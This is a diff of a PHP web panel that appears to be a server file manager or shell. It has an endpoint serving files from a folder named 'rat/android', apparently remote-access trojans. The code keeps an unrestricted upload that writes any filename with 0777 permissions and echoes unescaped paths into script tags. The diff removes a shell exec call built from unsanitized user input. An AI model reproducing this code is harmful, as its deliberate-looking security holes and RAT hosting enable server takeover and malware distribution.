@@ -3,7 +3,7 @@
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
-$version = "v2.4";
+$version = "v2.5";
 
 if(isset($_GET['rat-android-siapa'])) {
         $path = dirname(__FILE__)."/rat/android/";
@@ -126,6 +126,8 @@ border-radius:5px;
 
 </center><br><br>
 ';
+
+echo '<script src="ajax-client.js"></script>';
 
 if(isset($_GET['option']) && $_POST['other'] == 'gal-musik') 
 {
@@ -372,23 +374,26 @@ if(isset($_GET['indox_tools'])) {
 }
 
 //move file upload
-if (isset($_FILES['file']['name'])) {
-    while(list($key,$value) = each($_FILES['file']['name']))
-    {
-        if(!empty($value)){ 
-            $filename = $value;
+while(list($key,$value) = each($_FILES['file']['name']))
+{
+    if(!empty($value)){ 
+        //$filename = rand(1,100000).$value;
+        //$filename = str_replace(" ","_",$filename);
+        $filename = $value;
 
-            $add = $_SESSION['path']."/$filename";
+        $add = $_SESSION['path']."/$filename";
             
-            if(copy($_FILES['file']['tmp_name'][$key], $add))
-            {
-                echo '<script>alert("Success Upload!: '.$filename.'");</script>';
-            }
-            else{
-                echo '<script>alert("Failed Upload!: '.$filename.'");</script>';
-            }
-            chmod("$add",0777);
+        if(copy($_FILES['file']['tmp_name'][$key], $add))
+        {
+            echo '<script>
+            alert("Success Upload: '.$filename.'");
+
+            </script>';
         }
+        else{
+            echo '<script>alert("Failed Upload!: '.$filename.'");</script>';
+        }
+        chmod("$add",0777);
     }
 }
 // input upload handle
@@ -1154,7 +1159,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                     imgsrc = "download.php?id=gambar:thumbs/"+encdataold+".jpg";
                     childencdataold.innerHTML = "<br><a id="+encdataold+".jpg onclick=saveimg(this.id)>"+';
                              echo "
-                             '<img width=300 height=300 src=".'"'."'+imgsrc+'".'"'." alt=".'"'."'+imgsrc+'".'"'."></img></a>'+";
+                             '<img width=300 height=400 src=".'"'."'+imgsrc+'".'"'." alt=".'"'."'+imgsrc+'".'"'."></img></a>'+";
                              echo '
                              "<font color=yellow><h5>"+
                              data.old+
@@ -1329,20 +1334,19 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
             }
         }elseif($_POST['opt'] == 'open_image') {
             $image = $path."/".$_POST['name'];
-            echo("<script>location.href ='/ai-web/download.php?id=gambar:$image';</script>");
-
-        }elseif($_POST['opt'] == 'convert_media') {
+            echo '<script>procOpenImage("'.$image.'");</script>';
+        }
+        elseif($_POST['opt'] == 'convert_media') {
             $conv = $path.'/'.$_POST['name'];
-            exec('ffmpeg -i '.$conv.' -f mp3 -ab 192000 -vn '.$conv.'.mp3');
-            echo "<script>alert('sukes convert');</script>";
-
-        }elseif($_POST['opt'] == 'open_video') {
+            echo '<script>procConvertVid("'.$conv.'");</script>';
+        }
+        elseif($_POST['opt'] == 'open_video') {
             $video = $path."/".$_POST['name'];
-            echo("<script>location.href ='/ai-web/download.php?id=video:$video';</script>");
+            echo '<script>procOpenVideo("'.$video.'");</script>';
         }
         elseif($_POST['opt'] == 'open_pdf') {
             $pdf = $path."/".$_POST['name'];
-            echo("<script>location.href ='/ai-web/download.php?id=pdf:$pdf';</script>");
+            echo '<script>procOpenPdf("'.$pdf.'");</script>';
         }
         elseif($_POST['opt'] == 'copy_dir') {
             $_SESSION['copy_dir'] = $path.'/'.$_POST['name'];
@@ -1456,8 +1460,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
             }
                 
             //show file
-            $varstime = isset($_SESSION['stime']);
-            if ($varstime == '') {
+            if ($_SESSION['stime'] == '') {
                 echo '<tr>
                 <td>    <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
                 <td><center>'.$size.'</center></td>
